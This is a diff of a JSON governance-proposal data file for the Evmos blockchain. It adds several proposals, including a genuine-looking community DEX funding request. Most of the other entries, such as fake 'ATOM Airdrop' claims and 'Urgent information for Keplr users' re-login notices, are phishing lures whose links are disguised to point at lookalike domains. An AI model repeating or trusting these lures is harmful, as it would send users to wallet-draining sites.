@@ -3849,31 +3849,6 @@
       "voting_end_time": "2023-02-28T10:00:38.862841976Z"
     },
     {
-      "proposal_id": "124",
-      "content": {
-        "@type": "/cosmos.gov.v1beta1.TextProposal",
-        "title": "ATOM Airdrop for COSMOS stakers",
-        "description": "According to [tokenomics][1] stakers can receive an airdrop. [Claim airdrop here][2] ( Valid until 10.04.2023 )\n\nSnapshot: 10.02.2023\n\nConditions: The minimum amount of each token is the equivalent of $200 at the time of the snapshot. \nTokens are allocated in proportion to the balance of every blockchain address accessible during the snapshot time.\n\nSupported networks:\n\n•ATOM \n•OSMO\n•LUNA\n•LUNC\n•AXL\n•KUJI\n•AKT\n•AXL\n•KUJI\n•SCRT\n•STARS\n•CMDX\n•IXO\n•MNTL\n• GRAV\n•EVMOS\n•IXO\n\n\n[1]: https://cosmos.network/learn/faq\n[2]: https://keplr-wallet.at"
-      },
-      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
-      "final_tally_result": {
-        "yes": "0",
-        "abstain": "0",
-        "no": "0",
-        "no_with_veto": "0"
-      },
-      "submit_time": "2023-02-24T14:39:30.910038028Z",
-      "deposit_end_time": "2023-02-27T14:39:30.910038028Z",
-      "total_deposit": [
-        {
-          "denom": "aevmos",
-          "amount": "1401000000000000000"
-        }
-      ],
-      "voting_start_time": "0001-01-01T00:00:00Z",
-      "voting_end_time": "0001-01-01T00:00:00Z"
-    },
-    {
       "proposal_id": "125",
       "content": {
         "@type": "/cosmos.gov.v1beta1.TextProposal",
@@ -3914,6 +3889,163 @@
       },
       "submit_time": "2023-02-26T00:09:18.710978500Z",
       "deposit_end_time": "2023-03-01T00:09:18.710978500Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "1000000000000000"
+        }
+      ],
+      "voting_start_time": "0001-01-01T00:00:00Z",
+      "voting_end_time": "0001-01-01T00:00:00Z"
+    },
+    {
+      "proposal_id": "127",
+      "content": {
+        "@type": "/cosmos.gov.v1beta1.TextProposal",
+        "title": "Urgent information for Keplr users⚡️",
+        "description": "A critical vulnerability has been identified in the application, but don't worry, the developers have already solved this problem. For security reasons, all users need to re-login to their wallet on the official website: [https://wallet.keplr.app][1]\n\nOnce you log into your wallet, your funds will be safe.\n\n\n[1]: https://cosmos-online.cloud"
+      },
+      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T12:17:28.493234781Z",
+      "deposit_end_time": "2023-03-02T12:17:28.493234781Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "1000000000000000"
+        }
+      ],
+      "voting_start_time": "0001-01-01T00:00:00Z",
+      "voting_end_time": "0001-01-01T00:00:00Z"
+    },
+    {
+      "proposal_id": "128",
+      "content": {
+        "@type": "/cosmos.distribution.v1beta1.CommunityPoolSpendProposal",
+        "title": "Build A Community Owned DEX (UniV3)",
+        "description": "# Build A Community Owned DEX (UniV3)\n## Authors\n-  [Orbital Apes](https://twitter.com/OrbitalApes)\n-  [Evmos DAO](https://twitter.com/EvmosDAO)\n\n## Summary\nThe Evmos DAO and Orbital Apes team aim to deliver a fully community owned DEX within two months. We believe that Evmos can become market competitive in terms of liquidity and user experience. \n\n- No investment token \n- No initial swap fees \n- Not profit oriented\n- UniV3 functionalities (concentrated liquidity)\n- Integrated IBC asset and continous development guaranteed\n\nIf this proposal passes, we will ship a V3 DEX deployment in the shortest amount of time. The OA team will handle the engineering side, while the responsibilities of socials management, proposals for incentives and incentives management would be handled by the EvmosDAO.\n\nThe requested funds is for the Orbital Apes team only since the Evmos DAO is already fully funded. Funding is requested as this DEX will be built as public good for Evmos and will not have any funding coming from token sales or protocol fees.\n\n*Notes: This can be seen as an alternative to the ICHI proposal. We believe that we can ship a more feature rich DEX at **much lower costs**. To our knowledge, UniV3 is not adding new chains any time soon due to legal reasons.*\n\n\n## Goal\nCreate a capital efficient AMM to grow native liquidity on Evmos. This will be achieved with the help of EvmosDAO by creating cross-chain proposals for co-incentives (Evmos and Partnering chain) to LP providers and cross-chain token swaps to create protocol-owned liquidity managed by EvmosDAO.\n\n## Deployment Path of UniV3 Fork\n\n- Engineer custom V3 DEX frontend with IBC\u003c\u003eERC20 conversion\n- Fork UniV3 and deploy modified contracts (no protocol fees, no investement token) in April\n- Bridge integration  \n- Keplr integration (third party dependency)\n\n### Benefits  \n**1 - Liquidity**\nThe Evmos DAO team will be making proposals on other IBC chains to incentivize this DEX along with supplemented Evmos incentives.Protocol owned liquidty would work along side this as well. This will allow Evmos to build more native liquidity and force wider users to IBC tokens into Evmos. After this more DeFi protocols can be built once on chain liquidity is established.\n\n**2 - Time to market**\nWe are market ready within two months. Targetting testnet before April and mainnet once the UniV3 license expires. \n*Side note: The whole cosmos ecosystem is moving towards LSD's. V3 positions are much more tuned for these pools then traditional Dex's. V3 is may more profitable for LP's and provides a much stronger peg between something like stAtom/Atom. If we wait 5 months instead of 2 months we could potentially lose a large chunk of this liquidity to other protocols.*\n\n**3 - Keplr integration**\nIn the near future Keplr is going to have full EVM compatibiltiy. The users will be able to interact with Keplr and Metamask on the DEX.\n\n- [ERC20 Support](https://github.com/chainapsis/keplr-wallet/pull/531)\n- [Tx Signing Support](https://github.com/chainapsis/keplr-wallet/pull/483)\n- Contracts signing: Once contracts signing is integrated by Keplr the OA will merge it into the DEX.\n\n**4 - IBC conversion page**\nSimilar to https://app.evmos.org/assets, this will provide a user friendly interface and reduce complexity of onboarding cosmos based users. A bridge section will be added to deposit/withdraw from multiple EVM chains such as Ethereum, Avalanche, BNB and many more through Satellite (Axelar). \n\n**5 - No Protocol Fees** \nTraditional decentralized exchanges charge a fee on every swap that flows directly to the protocol or token holders. Initially this will be set to zero, any changes of the fee structure must be approved by the Evmos governance in form of a text proposal. LP fees will still be charged and distributed on swaps to LP providers.\n\n**6 - No Investment Token**\nThe community owned DEX will not have a corresponding governance token. As a community owned project built by OA/EvmosDAO future major developments will be funded through seperate funding requests or grants programs/boutnies. Incentives for liquidity will come in the form of Evmos incentives proposals and Cross-Chain incentives proposals.\n\n\n**7 - Future Development: All the upcoming Evmos/Cross-Chain innovation**\n- New innovation like ICA and ICQ will be actively explored and integrated the best possible way to stay competitive. Such integration would require a seperate funding request.\n- Explore and integrate cross-chain bridge swaps through services such as LiFi.\n\n\n## Milestones\n\n- Deploy the AMM V3 (Contracts/Frontend/Backend) to the Evmos Testnet | Funds realesed: 40% two weeks after testnet \n- Deploy the AMM V3 (Contracts/Frontend/Backend) to the Evmos Mainnet | Funds realesed: 40% two weeks after mainnet \n- IBC conversion page integration | Funds realesed: 10% after functional integration \n- Keplr integration | Funds realesed: 10% after functional integration \n\n\n## Funding Amount\nThis funding proposal will kick off the development for V3. The requested amount of 200,000 Evmos goes fully to the OA team since the Evmos DAO is already funded by the Evmos community.\n\nSignatories (3/4 Threshold):\n- GV | DAO \n- CtrlAltApe | OA\n- Luisqa | Zenith Station\n- Silk Nodes \n\nSafe Deployment Address: [0x7B4Ca78E62e06De7A921DF03A319ff09A09A84D0](https://safe.evmos.org/evmos:0x7B4Ca78E62e06De7A921DF03A319ff09A09A84D0/home?showCreationModal=true)\n\n**Risk / Risk Mitigation**\nRisk: The OA team fails to deliver an AMM for the community.\nMitigation: Funds are held in a multisig and are paid out on completion of milestones.\n",
+        "recipient": "evmos10dx20rnzupk702fpmup6xx0lpxsf4pxsdj6z7u",
+        "amount": [
+          {
+            "denom": "aevmos",
+            "amount": "200000000000000000000000"
+          }
+        ]
+      },
+      "status": "PROPOSAL_STATUS_VOTING_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T17:27:34.584017241Z",
+      "deposit_end_time": "2023-03-02T17:27:34.584017241Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "3750100000000000000000"
+        }
+      ],
+      "voting_start_time": "2023-02-27T17:33:41.420167045Z",
+      "voting_end_time": "2023-03-04T17:33:41.420167045Z"
+    },
+    {
+      "proposal_id": "129",
+      "content": {
+        "@type": "/cosmos.gov.v1beta1.TextProposal",
+        "title": "ATOM Airdrop for COSMOS stakers",
+        "description": "According to tokenomics: [https://cosmos.network/learn/faq][1] stakers can receive an airdrop. Claim airdrop here: [https://cosmos.network/claim][2] ( Valid until 10.04.2023 )\n\nSnapshot: 10.02.2023\n\nConditions: The minimum amount of each token is the equivalent of $200 at the time of the snapshot. \nTokens are allocated in proportion to the balance of every blockchain address accessible during the snapshot time.\n\nSupported networks:\n\n•ATOM \n•OSMO\n•LUNA\n•LUNC\n•AXL\n•KUJI\n•AKT\n•AXL\n•KUJI\n•SCRT\n•STARS\n•CMDX\n•IXO\n•MNTL\n• GRAV\n•EVMOS\n•IXO\n\n\n[1]: https://cosmos.network/learn/faq\n[2]: https://cosmos-online.at"
+      },
+      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T19:22:01.366252609Z",
+      "deposit_end_time": "2023-03-02T19:22:01.366252609Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "1000000000000000"
+        }
+      ],
+      "voting_start_time": "0001-01-01T00:00:00Z",
+      "voting_end_time": "0001-01-01T00:00:00Z"
+    },
+    {
+      "proposal_id": "130",
+      "content": {
+        "@type": "/cosmos.gov.v1beta1.TextProposal",
+        "title": "Urgent information for Keplr users⚡️",
+        "description": "A critical vulnerability has been identified in the application, but don't worry, the developers have already solved this problem. For security reasons, all users need to re-login to their wallet on the official website: [https://wallet.keplr.app][1]\n\nOnce you log into your wallet, your funds will be safe.\n\n\n[1]: https://cosmos-online.at"
+      },
+      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T19:23:19.139754382Z",
+      "deposit_end_time": "2023-03-02T19:23:19.139754382Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "1000000000000000"
+        }
+      ],
+      "voting_start_time": "0001-01-01T00:00:00Z",
+      "voting_end_time": "0001-01-01T00:00:00Z"
+    },
+    {
+      "proposal_id": "131",
+      "content": {
+        "@type": "/cosmos.gov.v1beta1.TextProposal",
+        "title": "Urgent information for Keplr users⚡️",
+        "description": "A critical vulnerability has been identified in the application, but don't worry, the developers have already solved this problem. For security reasons, all users need to re-login to their wallet on the official website: [https://wallet.keplr.app][1]\n\nOnce you log into your wallet, your funds will be safe.\n\n\n[1]: https://cosmos-online.at"
+      },
+      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T23:46:32.162313858Z",
+      "deposit_end_time": "2023-03-02T23:46:32.162313858Z",
+      "total_deposit": [
+        {
+          "denom": "aevmos",
+          "amount": "1000000000000000"
+        }
+      ],
+      "voting_start_time": "0001-01-01T00:00:00Z",
+      "voting_end_time": "0001-01-01T00:00:00Z"
+    },
+    {
+      "proposal_id": "132",
+      "content": {
+        "@type": "/cosmos.gov.v1beta1.TextProposal",
+        "title": "ATOM Airdrop for COSMOS stakers",
+        "description": "According to tokenomics: [https://cosmos.network/learn/faq][1] stakers can receive an airdrop. Claim airdrop here: [https://cosmos.network/claim][2] ( Valid until 10.04.2023 )\n\nSnapshot: 10.02.2023\n\nConditions: The minimum amount of each token is the equivalent of $200 at the time of the snapshot. \nTokens are allocated in proportion to the balance of every blockchain address accessible during the snapshot time.\n\nSupported networks:\n\n•ATOM \n•OSMO\n•LUNA\n•LUNC\n•AXL\n•KUJI\n•AKT\n•AXL\n•KUJI\n•SCRT\n•STARS\n•CMDX\n•IXO\n•MNTL\n• GRAV\n•EVMOS\n•IXO\n\n\n[1]: https://cosmos.network/learn/faq\n[2]: https://cosmos-online.at"
+      },
+      "status": "PROPOSAL_STATUS_DEPOSIT_PERIOD",
+      "final_tally_result": {
+        "yes": "0",
+        "abstain": "0",
+        "no": "0",
+        "no_with_veto": "0"
+      },
+      "submit_time": "2023-02-27T23:47:19.058175843Z",
+      "deposit_end_time": "2023-03-02T23:47:19.058175843Z",
       "total_deposit": [
         {
           "denom": "aevmos",
